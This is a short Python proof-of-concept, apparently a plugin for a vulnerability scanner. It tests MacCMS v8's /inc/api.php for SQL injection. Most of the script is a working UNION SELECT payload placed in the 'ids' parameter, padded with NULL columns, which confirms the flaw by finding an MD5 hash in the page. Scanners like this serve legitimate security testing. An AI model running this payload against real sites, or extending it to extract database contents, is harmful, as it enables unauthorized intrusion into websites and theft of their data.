#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:ko0zhi
"""
POC Name  :	MacCMS v8 /inc/api.php  SQL注入漏洞
Reference  : http://wooyun.org/bugs/wooyun-2014-066130
"""


def assign(service,arg):
    if service == "maccms":
        return True,arg
    pass

def audit(arg):
    url = arg
    payload = '/inc/api.php?ac=videolist&t=0&pg=0&ids=1%29%20Union%20sElect/**/md5(3.1415),'
    verify_url = url +  payload + 'NULL,' * 48 + 'NULL%23'
    code,head,res,errcode, final_url = curl.curl(verify_url)
    if '63e1f04640e83605c1d177544a5a0488' in res:
        security_hole('find sql injection:' +verify_url)
    pass

if __name__ == "__main__":
    from dummy import *
    audit(assign('maccms', 'http://www.example.com/')[1])